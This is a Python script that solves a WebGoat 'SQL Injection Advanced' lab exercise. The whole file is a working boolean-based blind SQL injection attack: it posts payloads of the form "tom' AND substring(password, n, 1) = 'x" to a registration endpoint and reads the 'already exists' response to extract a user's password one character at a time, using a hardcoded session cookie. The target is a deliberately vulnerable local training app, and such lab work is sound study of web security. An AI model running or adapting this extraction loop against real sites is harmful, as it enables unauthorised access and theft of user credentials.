import json
import requests

def sql_injection_advanced_5():
    url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/register"  # <-- PUT your real backend URL here

    webgoat_session_id = "D20C27A7D8938070FB259D1DC450FAED"  # <-- Insert your real JSESSIONID

    headers = {
        "Cookie": "JSESSIONID=" + webgoat_session_id,
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "http://127.0.0.1:8080/WebGoat/start.mvc",
        "Origin": "http://127.0.0.1:8080",
    }

    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    password = ""
    password_index = 0

    while True:
        found = False
        for letter in alphabet:
            payload = f"tom' AND substring(password, {password_index + 1}, 1) = '{letter}"
            data = {
                'username_reg': payload,
                'email_reg': 'a@a.com',
                'password_reg': 'a',
                'confirm_password_reg': 'a'
            }

            r = requests.post(url, headers=headers, data=data)  # <-- use POST if WebGoat uses POST!

            try:
                response = json.loads(r.text)
            except Exception as e:
                print("Invalid session or unexpected server response:", e)
                return

            feedback = response.get('feedback', '')
            if "already exists" in feedback:
                password += letter
                print("Partial password:", password)
                found = True
                break

        if not found:
            print(f"Stopping at position {password_index + 1}")
            break

        password_index += 1

    print("\nCompleted. Final password:", password)

# Run the function
sql_injection_advanced_5()
